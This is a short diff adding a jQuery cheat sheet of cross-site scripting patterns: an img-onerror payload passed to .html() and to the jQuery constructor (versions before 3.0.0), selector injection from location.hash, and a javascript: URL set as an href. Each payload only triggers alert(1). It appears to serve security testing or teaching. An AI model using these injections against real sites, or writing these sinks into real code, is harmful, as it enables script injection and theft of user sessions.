@@ -1,0 +1,9 @@
+$(function(){
+  $('#element').html('<img src=x onerror=alert(1)>');
+});
+// jQuery < 3.0.0
+$('<img src=x onerror=alert(1)>');
+// Selector Injection
+$(location.hash);
+// Attribute Injection
+$('div').attr('href', 'javascript:alert(1)');
